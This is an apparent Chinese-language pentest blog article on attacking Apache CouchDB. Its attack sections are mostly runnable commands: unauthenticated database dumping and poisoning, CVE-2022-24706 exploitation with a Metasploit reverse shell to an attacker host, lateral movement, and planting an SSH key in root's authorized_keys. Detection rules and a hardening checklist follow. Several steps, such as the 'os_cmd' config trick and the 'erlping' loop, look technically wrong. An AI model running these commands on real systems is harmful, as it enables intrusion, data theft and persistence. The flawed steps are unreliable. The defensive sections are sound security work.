---
title: "Apache CouchDB Erlang Cookie / HTTP API 未授权访问与 RCE 利用技术"
date: 2026-06-21T12:00:00+08:00
draft: false
weight: 97
description: "Apache CouchDB NoSQL 文档数据库渗透测试：Erlang Cookie 硬编码 RCE、CVE-2022-24706 未授权远程代码执行、HTTP API 未授权访问、集群横向移动与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Apache CouchDB", "Erlang Cookie", "CVE-2022-24706", "RCE", "未授权访问", "NoSQL", "渗透测试"]
---

## 0x00 攻击面总览

Apache CouchDB 是 NoSQL 文档数据库，构建于 Erlang/OTP 平台，默认配置存在多个高危风险：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| CouchDB HTTP API | 5984 | HTTP | 数据库 CRUD、管理 API（默认无认证） |
| epmd | 4369 | TCP | Erlang 节点名映射查询 |
| Erlang Distribution | 动态端口 | TCP | 节点间通信、RCE（CVE-2022-24706） |
| Fauxton Web UI | 5984 | HTTP | 管理界面 |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    Apache CouchDB 集群                          │
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ CouchDB Node1│    │ CouchDB Node2│    │ epmd         │    │
│  │ :5984 (HTTP) │    │ :5984 (HTTP) │    │ :4369        │    │
│  │ Erlang Dist  │    │ Erlang Dist  │    │ 节点名映射    │    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│  ┌──────┴───────────────────┴────────────────────┴─────────┐ │
│  │              内网 / 数据库专用网络                         │ │
│  │                                                          │ │
│  │  攻击路径：                                               │ │
│  │  ① HTTP API :5984 → 未授权访问 → 数据库枚举/数据窃取      │ │
│  │  ② epmd :4369 → 节点名查询 → Erlang Cookie RCE           │ │
│  │  ③ CVE-2022-24706 → 硬编码 Cookie "monster" → RCE        │ │
│  │  ④ _node API → 配置修改 → 任意文件写入                    │ │
│  │  ⑤ 集群横向移动 → 所有节点共享同一 Cookie                  │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                               │
│  默认风险：                                                    │
│  • HTTP API 默认无认证（require_valid_user = false）            │
│  • Erlang Cookie 硬编码为 "monster"                            │
│  • epmd 端口默认对外开放                                        │
│  • _node API 默认允许匿名访问                                   │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 4369,5984 \
  --script=couchdb-info,erlang-info \
  -oN couchdb_scan.txt <target>
```

**典型扫描结果**：

```
PORT     STATE SERVICE     VERSION
4369/tcp open  epmd        Erlang Port Mapper Daemon
5984/tcp open  couchdb     Apache CouchDB 3.3.3
```

### 1.2 版本指纹

```bash
# 获取 CouchDB 版本
curl -s "http://target:5984/" | python3 -m json.tool

# 响应示例
{
  "couchdb": "Welcome",
  "version": "3.3.3",
  "git_sha": "abc123",
  "uuid": "cluster-uuid",
  "features": ["access-ready", "partitioned", "pluggable-storage-engines"],
  "vendor": {
    "name": "The Apache Software Foundation"
  }
}

# 获取 epmd 节点信息
epmd -names -address target

# 响应示例
# epmd: up and running on port 4369
# name couchdb at port 25672
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"CouchDB"
port:5984 http.title:"CouchDB"
product:"CouchDB"

# FOFA
body="CouchDB" && port="5984"
app="Apache-CouchDB"
```

---

## 0x02 HTTP API 未授权访问 — 数据窃取

### 2.1 数据库枚举

```bash
# 列出所有数据库
curl -s "http://target:5984/_all_dbs" | python3 -m json.tool

# 响应示例
["_global_changes", "_metadata", "_replicator", "_users", "production_data", "user_sessions"]
```

### 2.2 数据读取

```bash
# 获取数据库信息
curl -s "http://target:5984/production_data" | python3 -m json.tool

# 列出文档
curl -s "http://target:5984/production_data/_all_docs" | python3 -m json.tool

# 读取特定文档
curl -s "http://target:5984/production_data/doc_id" | python3 -m json.tool

# 批量读取文档
curl -s -X POST "http://target:5984/production_data/_bulk_get" \
  -H "Content-Type: application/json" \
  -d '{"docs": [{"id": "doc1"}, {"id": "doc2"}]}' | python3 -m json.tool
```

### 2.3 用户信息枚举

```bash
# 列出用户
curl -s "http://target:5984/_users/_all_docs" | python3 -m json.tool

# 读取用户文档（可能含密码哈希）
curl -s "http://target:5984/_users/org.couchdb.user:admin" | python3 -m json.tool
```

### 2.4 数据写入

```bash
# 创建数据库
curl -s -X PUT "http://target:5984/backdoor_db"

# 写入文档
curl -s -X PUT "http://target:5984/production_data/doc_id" \
  -H "Content-Type: application/json" \
  -d '{"key": "malicious_value"}'

# 批量写入
curl -s -X POST "http://target:5984/production_data/_bulk_docs" \
  -H "Content-Type: application/json" \
  -d '{"docs": [{"_id": "doc1", "data": "injected"}, {"_id": "doc2", "data": "poisoned"}]}'
```

---

## 0x03 CVE-2022-24706 — Erlang Cookie 硬编码 RCE

### 3.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | Apache CouchDB < 3.2.2 |
| CVSS | 10.0（Critical） |
| 类型 | 硬编码凭证 / 分布式协议认证缺陷 |
| 攻击向量 | Erlang Distribution Protocol（epmd + 动态端口） |
| 认证要求 | 无（使用已知默认 Cookie） |
| 根因 | 默认 Erlang Cookie 硬编码为 `monster` |

### 3.2 关联 CVE 攻击链

| CVE | 描述 | CVSS |
|-----|------|------|
| CVE-2022-24705 | _node API 未授权访问 | 9.8 |
| CVE-2022-24706 | Erlang Cookie 硬编码 RCE | 10.0 |
| CVE-2022-24707 | _node API 任意文件写入 | 8.0 |

### 3.3 攻击流程

```
epmd :4369 → 查询节点名 (couchdb@target)
    │
    ▼
Erlang Dist 端口 → 使用 Cookie "monster" 握手
    │
    ▼
认证通过 → 获得 Erlang Shell 级别控制
    │
    ▼
os:cmd("command") → RCE
```

### 3.4 漏洞利用

```bash
# 步骤 1：通过 epmd 获取节点名
epmd -names -address target
# 输出：name couchdb at port 25672

# 步骤 2：使用 Metasploit 利用
msfconsole
use exploit/multi/misc/erlang_cookie_rce
set RHOSTS target
set RPORT 25672
set COOKIE monster
set NODENAME couchdb@127.0.0.1
set PAYLOAD payload/cmd/unix/reverse
set LHOST attacker_ip
exploit
```

### 3.5 通过 _node API 利用

```bash
# 步骤 1：获取节点配置（CVE-2022-24705）
curl -s "http://target:5984/_node/couchdb@127.0.0.1/_config" | python3 -m json.tool

# 步骤 2：修改配置执行命令
curl -s -X PUT "http://target:5984/_node/couchdb@127.0.0.1/_config/os_cmd" \
  -H "Content-Type: application/json" \
  -d '"id"'

# 步骤 3：读取命令输出
curl -s "http://target:5984/_node/couchdb@127.0.0.1/_config/os_cmd"
```

---

## 0x04 集群横向移动

### 4.1 获取集群拓扑

```bash
# 获取集群成员
curl -s "http://target:5984/_membership" | python3 -m json.tool

# 响应示例
{
  "cluster_nodes": ["couchdb@node1", "couchdb@node2", "couchdb@node3"],
  "all_nodes": ["couchdb@node1", "couchdb@node2", "couchdb@node3"]
}
```

### 4.2 横向移动

```bash
# 所有节点共享同一 Erlang Cookie
# 使用相同 Cookie 攻击其他节点的 Erlang 分布端口
for node in node1 node2 node3; do
  erlping -c monster -n couchdb@$node.internal:4369
done
```

---

## 0x05 任意文件写入 — CVE-2022-24707

### 5.1 通过 _node API 写入文件

```bash
# 写入 SSH authorized_keys
curl -s -X PUT "http://target:5984/_node/couchdb@127.0.0.1/_config/query_servers/cmd" \
  -H "Content-Type: application/json" \
  -d '"/bin/bash -c \"echo ssh-rsa AAAA... >> /root/.ssh/authorized_keys\""'
```

---

## 0x06 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2022-24705 | 未授权访问 | 9.8 | _node API 未授权访问 |
| CVE-2022-24706 | RCE | 10.0 | Erlang Cookie 硬编码 RCE |
| CVE-2022-24707 | 文件写入 | 8.0 | _node API 任意文件写入 |
| CVE-2017-12635 | RCE | 10.0 | 远程代码执行 |
| CVE-2017-12636 | 信息泄露 | 7.5 | 敏感信息泄露 |

**CVE-2022-24706 影响范围**：

Apache CouchDB < 3.2.2。全球大量暴露实例受影响。已被 CISA 列入 KEV 目录，确认存在在野利用。Pwn2Own 2022 竞赛中披露。

---

## 0x07 蓝队检测方案

### 7.1 网络层检测

```yaml
title: CouchDB epmd/Erlang 外部访问检测
id: couchdb-epmd-external-access
status: experimental
description: 检测来自非内网段的 epmd 和 Erlang 分布端口访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 4369
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 7.2 RCE 检测

```yaml
title: CouchDB Erlang Cookie RCE 检测
id: couchdb-erlang-cookie-rce
status: experimental
description: 检测 Erlang 分布协议中的硬编码 Cookie 利用
logsource:
  category: network
detection:
  selection_epmd:
    dst_port: 4369
    protocol: "TCP"
  selection_dist:
    payload|contains:
      - "couchdb@"
      - "monster"
  condition: selection_epmd or selection_dist
level: critical
```

### 7.3 审计日志分析

```bash
# 监控 epmd 连接
lsof -i :4369
netstat -antp | grep 4369

# 监控 _node API 访问
grep "_node" /opt/couchdb/var/log/couchdb/couchdb.log

# 检测异常配置修改
grep -E "(os_cmd|query_servers)" /opt/couchdb/var/log/couchdb/couchdb.log

# 监控管理员账户变更
grep -i "admins" /opt/couchdb/var/log/couchdb/couchdb.log

# 检查 Erlang 分布端口异常连接
ps aux | grep beam
lsof -p <beam_pid> -i -n
```

### 7.4 加固清单

```
[ ] 升级至 Apache CouchDB >= 3.2.2（修复 CVE-2022-24706）
[ ] 更换 Erlang Cookie 为随机强密码：
    -setcookie $(openssl rand -hex 32)
[ ] 限制 epmd 端口 (4369) 仅允许内网访问
[ ] 限制 Erlang 分布端口范围：
    -kernel inet_dist_listen_min 9100
    -kernel inet_dist_listen_max 9105
[ ] 启用 CouchDB 认证：require_valid_user = true
[ ] 设置强密码管理员账户
[ ] CouchDB HTTP API (5984) 仅允许内网访问
[ ] 在前面放置反向代理并启用认证
[ ] 启用 HTTPS 并配置 TLS 证书
[ ] 启用审计日志并接入 SIEM
[ ] 监控 epmd 和 Erlang 分布端口异常连接
[ ] 监控 _node API 异常配置修改
[ ] 定期审查集群节点和 Cookie 配置
[ ] Docker 环境使用随机 COUCHDB_ERLANG_COOKIE
```

---

## 0x08 渗透测试检查清单

```
[ ] 端口扫描：4369, 5984
[ ] epmd (4369) 节点名枚举测试
[ ] CouchDB HTTP API (5984) 未授权访问测试
[ ] 版本信息收集（/ 端点）
[ ] 数据库枚举（/_all_dbs）
[ ] 数据读取测试（/_all_docs）
[ ] 用户信息枚举（/_users）
[ ] CVE-2022-24705 _node API 未授权访问测试
[ ] CVE-2022-24706 Erlang Cookie RCE 测试
[ ] CVE-2022-24707 任意文件写入测试
[ ] 集群拓扑枚举（/_membership）
[ ] 集群横向移动测试
[ ] 数据写入/投毒测试
[ ] 认证配置检查
[ ] TLS/SSL 配置检查
[ ] Erlang Cookie 配置检查
```

---

## 0x09 小结

Apache CouchDB 的攻击面以 **Erlang Cookie 硬编码（CVE-2022-24706）** 和 **HTTP API 未授权访问** 为核心。CVE-2022-24706（CVSS 10.0）是最严重的漏洞之一，攻击者通过已知的默认 Erlang Cookie `monster` 可以直接在 Erlang 分布协议层实现 RCE，完全绕过 HTTP 层面的认证机制。三个关联 CVE（24705/24706/24707）构成完整的 **信息收集 → RCE → 持久化** 攻击链。集群模式下所有节点共享同一 Cookie，攻陷一个节点即可横向控制整个集群。蓝队应重点关注：升级至 3.2.2+、更换随机 Erlang Cookie、限制 epmd 和 Erlang 分布端口网络访问、启用认证、将审计日志接入 SIEM。
